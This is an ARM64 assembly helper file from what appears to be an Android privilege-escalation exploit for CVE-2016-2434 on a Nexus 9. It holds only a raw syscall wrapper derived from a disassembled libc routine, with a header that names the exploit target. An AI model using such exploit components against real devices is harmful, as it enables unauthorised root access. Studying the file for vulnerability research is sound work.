/*
 * Exploit for CVE-2016-2434 (AndroidID-27251090)
 *
 * Just for Nexus 9 MMB29R, if you want to run on other version, some symbol address should be changed
 *
 * shell@flounder:/ $ getprop ro.build.fingerprint 
 * google/volantis/flounder:6.0.1/MMB29R/2482564:user/release-keys
 *
 * By Jianqiang Zhao (zhaojianqiang1@gmail.com, twitter: @jianqiangzhao)
 *
 * 2-22-2016
 */

#define __ASSEMBLY__

#define ALIGN		.align 4,0x90

#ifndef ENTRY
#define ENTRY(name) \
  .globl name; \
  ALIGN; \
  name:
#endif

#ifndef END
#define END(name) \
  .size name, .-name
#endif


/*
00000000000198e4 <syscall>:
   198e4:       aa0003e8        mov     x8, x0
   198e8:       aa0103e0        mov     x0, x1
   198ec:       aa0203e1        mov     x1, x2
   198f0:       aa0303e2        mov     x2, x3
   198f4:       aa0403e3        mov     x3, x4
   198f8:       aa0503e4        mov     x4, x5
   198fc:       aa0603e5        mov     x5, x6
   19900:       d4000001        svc     #0x0
   19904:       b140041f        cmn     x0, #0x1, lsl #12
   19908:       da809400        cneg    x0, x0, hi
   1990c:       54040728        b.hi    219f0 <__set_errno_internal>
   19910:       d65f03c0        ret
*/

ENTRY(eabi_syscall)
	mov     x8, x0
	mov     x0, x1
	mov     x1, x2
	mov     x2, x3
	mov     x3, x4
	mov     x4, x5
	mov     x5, x6
	svc     #0x0
	ret
END(eabi_syscall)

